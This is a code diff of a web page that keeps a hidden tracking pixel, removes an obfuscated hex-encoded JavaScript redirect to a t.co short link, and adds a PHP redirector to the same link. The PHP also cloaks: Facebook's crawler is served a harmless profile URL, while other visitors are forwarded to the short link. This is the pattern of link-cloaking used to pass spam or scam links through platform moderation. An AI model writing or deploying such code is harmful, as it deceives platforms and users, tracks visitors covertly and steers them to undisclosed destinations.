@@ -1,3 +1,4 @@
+
 <script>
 const TRACKER_ID = "sempaix1max";
 const trackerURL = `//whos.amung.us/pingjs/?k=${TRACKER_ID}&t=%F0%9F%91%BD%E2%98%A0%EF%B8%8F%F0%9F%92%80%20LA%20KABRA%20%F0%9F%92%80%E2%98%A0%EF%B8%8F%F0%9F%91%BD&x=https://www.pngwing.com/"`;
@@ -5,14 +6,33 @@ document.write(`
     <img src="${trackerURL}" style="display:none" alt="">
 `);
 </script>
-<script>
-(function(x,y){
-  var z=[ 
-    "\x6C\x6F\x63\x61\x74\x69\x6F\x6E", // "location"
-    "\x68\x72\x65\x66",                 // "href"
-    "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x74\x2E\x63\x6F\x2F\x6D\x43\x79\x6D\x35\x42\x66\x72\x4A\x51" // URL destino
-  ];
-  window[z[0]][z[1]]=z[2];
-})();
-</script>
 
+<?php
+
+function generateRandomCode($length) {
+    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    $char_length = strlen($characters);
+    $random_code = '';
+
+    for ($i = 0; $i < $length; $i++) {
+        $random_code .= $characters[rand(0, $char_length - 1)];
+    }
+
+    return $random_code;
+}
+
+$pag = array(
+    "https://t.co/mCym5BfrJQ?token=" . generateRandomCode(16),
+);
+  $pag_ram = rand(0,count($pag)-1);
+
+
+ header("Location: $pag[$pag_ram]"); 
+ 
+if (preg_match("/facebook(external)?/i", $_SERVER['HTTP_USER_AGENT']))
+{
+ $short_urlx2 = "https://facebook.com/profile.php?token=".substr(md5(mt_rand()),0,20);
+        header("location: $short_urlx2", true, 200);
+        die();
+}   
+?>
